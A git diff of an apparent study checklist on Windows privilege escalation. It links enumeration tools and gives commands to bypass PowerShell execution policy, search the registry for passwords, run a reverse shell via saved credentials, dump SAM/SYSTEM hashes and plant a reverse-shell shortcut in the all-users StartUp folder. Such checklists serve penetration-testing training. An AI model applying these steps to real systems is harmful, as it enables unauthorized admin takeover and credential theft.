@@ -4,34 +4,45 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
 ## Windows Privilege Escalation Tools :
 
 1- PowerUp: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
-  example of usage: 
+```
+- example of usage: 
   - first get Powershell sessions 
     > powershell -exec bypass
     
     > . .\PowerUp.ps1
     
     > Invoke-AllChecks
-  
+```  
 2- SharpUp: 
+```
   - Code: https://github.com/GhostPack/SharpUp
   - Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
-  example of usage:
-    > .\SharpUp.exe
   
+  - example of usage:
+    > .\SharpUp.exe
+```  
 3- Seatbelt:
+```
   - Code: https://github.com/GhostPack/Seatbelt
   - Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
-  example of usage:
-  > .\Seatbelt.exe all
- 
-4- WinPEAS:  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
-  example of usage:
-  > .\WinPEAS.exe
   
+  - example of usage:
+    > .\Seatbelt.exe all
+``` 
+4- WinPEAS:
+```
+  - Code: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+  
+  - example of usage:
+    > .\WinPEAS.exe
+```
 5- accesschk.exe:
+```
   - AccessChkis an old but still trustworthy tool for checking user access control rights.
-  
+```
 ## Windows Privilege Escalation Techniques:
+
+```
 1- Kernel Exploits (last choice):
   - First Enumerate Windows version/patch level (systeminfo).
   - Find exploits on (searchsploit, Google, ExploitDB, GitHub)
@@ -41,7 +52,7 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
   - Windows Exploit Suggester: https://github.com/bitsadmin/wesngPrecompiled 
   - Pro Tip: First Check Those Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
     - Watson: https://github.com/rasta-mouse/Watson
-  
+
 2- Service Exploits:
    - Insecure Service Permissions
       - NOTE: if you can change a service configuration but cannot stop/start the service you may fall on RABBIT HOLE
@@ -60,9 +71,12 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
         
       
    - AlwaysInstallElevated
-      - NOTE: Two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1. If either of these are missing or disabled, the exploit will not work.<br />
-          >local machine:<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
-          >current user:<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
+      - NOTE: Two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1. If either of these are missing or disabled, the exploit will not work.
+          >local machine:
+          HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+          
+          >current user:
+          HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
       
       - check both registry values by winPEAS
           > .\winPEASany.exe quiet windowscreds
@@ -74,15 +88,18 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
     - Auto: 
       > .\winPEASany.exe quiet filesinfo userinfo
     - Manually:
-      > reg query HKLM /f password /t REG_SZ /s<br />
+      > reg query HKLM /f password /t REG_SZ /s
       > reg query HKCU /f password /t REG_SZ /s
+  
   - Saved Creds
-    > .\winPEASany.exe quiet cmd windowscreds<br />
-    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]<br />
+    > .\winPEASany.exe quiet cmd windowscreds
+    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]
+  
   - Configuration Files
     > dir/s *pass* == *.config<br />
     > findstr/sipassword *.xml *.ini*.txt<br />
     > .\winPEASany.exe quiet cmd searchfast filesinfo<br />
+  
   - SAM & SYSTEM
     - if you get SAM & SYSTEM can used to dump hashes by the following steps
       - first: Download the latest version of the creddump suite:
@@ -103,12 +120,13 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
     > schtasks /query /fo LIST /v
   - in PowerShell 
     > Get-ScheduledTask | where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
-    
+ 
 6- Startup Apps
-  - Windows has a startup directory for apps that should start for all users:<br />
-   >C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br />
+
+  - Windows has a startup directory for apps that should start for all users:
+   > C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
    
-   If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.<br />
+   If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
    Note: the created file should be shortcut files with (.lnk) extention. 
    
    - First: check your permissions on the StartUp directory:
@@ -116,13 +134,11 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    
    - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
    
-```
 Set oWS= WScript.CreateObject("WScript.Shell")
 sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
 Set oLink= oWS.CreateShortcut(sLinkFile)
 oLink.TargetPath= "C:\PrivEsc\reverse.exe"
 oLink.Save
-```
 
    - Finally: run the script:
       > cscript CreateShortcut.vbs
@@ -199,6 +215,7 @@ oLink.Save
       - SeCreateTokenPrivilege
       - SeLoadDriverPrivilege
       - SeDebugPrivilege(used by getsystem)
+```
 ## Privileges Escalition:
   1- Check your user (whoami) and groups (net user <username>)
   
